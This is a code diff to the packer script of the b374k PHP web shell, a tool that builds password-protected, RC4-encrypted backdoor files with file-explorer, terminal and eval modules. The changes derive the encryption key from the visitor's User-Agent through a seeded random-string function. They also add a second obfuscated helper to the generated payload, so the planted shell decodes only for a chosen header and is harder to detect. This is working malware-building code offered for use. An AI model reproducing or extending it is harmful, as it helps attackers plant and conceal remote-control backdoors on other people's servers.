@@ -20,7 +20,8 @@ $GLOBALS['packer']['network_rs_dir'] = "./network/rs/";
 $GLOBALS['packer']['resources_dir'] = "./resources/";
 
 $TRUST_USER_AGENT = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/64.0.3282.112 Mobile/15D60 Safari/604.1";
-$debug_rc4_key = md5('ua_' . $TRUST_USER_AGENT);
+$debug_rc4_key = generateRandomString(32, $TRUST_USER_AGENT);
+srand(time());
 $supported_network_rs_types = array('executable', 'gcc', 'java', 'php', 'python');
 
 require $GLOBALS['packer']['base_dir'].'jsPacker.php';
@@ -106,8 +107,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		}
 		packer_output('error');
 	}elseif(isset($p['outputfile'])&&isset($p['password'])&&isset($p['module'])&&isset($p['strip'])&&isset($p['base64'])&&isset($p['compress'])&&isset($p['compress_level'])&&isset($p['encode'])){
-        $GLOBALS['cipher_key'] = generateRandomString(32);
-		$outputfile = trim($p['outputfile']);
+        $outputfile = trim($p['outputfile']);
 		if(empty($outputfile)) $outputfile = 'b374k.php';
 		$password = trim($p['password']);
 		$modules = trim($p['module']);
@@ -120,8 +120,13 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		$compress_level = (int) $p['compress_level'];
 		$encode = addslashes(trim($p['encode']));
 
-		if($compress == 'rc4' && isset($p['user_agent']) && strlen(trim($p['user_agent'])) > 0) {
-            $GLOBALS['cipher_key'] = md5('ua_' . trim($p['user_agent']));
+		$seed = null;
+        if($compress == 'rc4' && isset($p['user_agent']) && strlen(trim($p['user_agent'])) > 0) {
+            $seed = $p['user_agent'];
+        }
+        $GLOBALS['cipher_key'] = generateRandomString(32, $seed);
+        if ($seed) {
+            srand(time());
         }
 
 		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);
@@ -444,7 +449,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
 		$phpcode = "<?php \$GLOBALS['encode']='{$encode}';".trim($module_init)."?>".trim($base_code).trim($module_code);
 
-        list($err, $code, $_) = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password, isset($opt['d']) ? 'kan6mh5r' : null);
+        list($err, $code, $_) = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password/*, isset($opt['d']) ? 'kan6mh5r' : null*/);
         $res = $err . packer_html_safe(trim($code ? $code : ""));
 		$status = explode("{[|a374k|]}", $res);
 		$output .= "Result\t\t\t: ".strip_tags($status[0])."\n\n";
@@ -649,7 +654,8 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
         $header = "<?php\n";
     }
     $bds = '_'.generateRandomString(2);
-	$rc4_function = $compress=="rc4" ? 'function rc4($a,$b){if(!$a){return 0;}$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}function '.$bds.'($s){$r='.'bzdecompress($s);if(gettype($r)=="integer"){phpinfo();return "";}else{return $r;}}':'';
+    $cs = '_'.generateRandomString(2);
+	$rc4_function = $compress=="rc4" ? 'function rc4($a,$b){if(!$a){return 0;}$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}function '.$bds.'($s){$r='.'bzdecompress($s);if(gettype($r)=="integer"){phpinfo();return "";}else{return $r;}}function '.$cs.'($s){srand(crc32(trim($s)));$cs="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";$cl=strlen($cs)-1;$s="";for($i=0;$i<32;$i++){$s.=$cs[rand(0,$cl)];}srand(time());return $s;}':'';
 
 	if($strip=='yes'){
 		$phpcode = packer_strips($phpcode);
@@ -685,7 +691,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$content = base64_encode($content);
 		if($compress!='no'){
 			if($compress=="rc4") {
-				$encoder = $bds."(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:md5(\\'ua_\\'.\$_SERVER[\\'HTTP_USER_AGENT\\']),ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
+				$encoder = $bds."(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:".$cs."(\$_SERVER[\\'HTTP_USER_AGENT\\']),ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
 			} else {
 				$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
 			}
@@ -712,7 +718,10 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 	return array("error{[|a374k|]}", null, null);
 }
 
-function generateRandomString($length = 10) {
+function generateRandomString($length = 10, $seed = null) {
+    if ($seed) {
+        srand(crc32(trim($seed)));
+    }
     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
     $charactersLength = strlen($characters);
     $randomString = '';
